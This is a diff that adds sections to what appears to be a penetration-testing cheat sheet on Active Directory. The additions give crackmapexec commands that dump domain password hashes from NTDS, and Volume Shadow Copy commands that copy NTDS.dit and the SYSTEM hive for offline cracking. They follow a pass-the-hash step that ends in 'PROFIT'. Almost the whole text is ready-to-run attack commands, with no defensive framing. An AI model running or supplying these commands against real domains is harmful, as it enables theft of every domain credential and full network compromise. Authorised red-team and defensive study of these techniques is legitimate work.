@@ -45,3 +45,20 @@
 #### 10) Do a Pass-the-Hash attack with wmiexec/smbexec/psexec or evil-winrm 
 
 #### 11) PROFIT
+
+# CRACKMAPEXEC
+
+#### 1) crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds
+
+#### 2) crackmapexec smb 10.10.10.10 -u 'username' -p 'password' --ntds drsuapi
+
+#### 3) crackmapexec smb 10.10.0.202 -u username -p password --ntds vss
+
+# VOLUME SHADOW COPY (VSS)
+
+#### 1) vssadmin create shadow /for=C:
+
+#### 2) copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
+
+#### 3) copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
+
